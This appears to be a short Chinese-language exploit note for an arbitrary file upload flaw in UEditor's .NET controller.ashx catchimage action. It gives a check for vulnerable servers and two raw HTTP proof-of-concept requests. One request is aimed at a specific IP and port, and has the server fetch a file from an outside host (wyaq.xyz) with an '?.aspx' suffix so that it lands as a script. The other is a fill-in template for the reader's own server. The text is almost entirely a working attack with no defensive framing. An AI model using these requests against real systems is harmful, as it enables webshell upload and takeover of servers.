验证：

UEditor/net/controller.ashx?action=catchimage

显示 {“state”:”参数错误：没有指定抓取源”}
就基本可以继续尝试漏洞利用

poc：

```html
GET /Scripts//UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 121.17.5.250:10012
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

source[]=http://wyaq.xyz/a.jpg?.aspx
```

服务器中的存为a.jpg

```
上传文件路径
127.0.0.1/UEditor/net/upload/image/
```



教程给的poc

https://mp.weixin.qq.com/s/1sfhjhWB6vJbxQEY5QzNXA

相关文章

```html
POST /替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

source[]=http://替换为自己服务器开启http服务的URL地址/666.jpg?.aspx
```

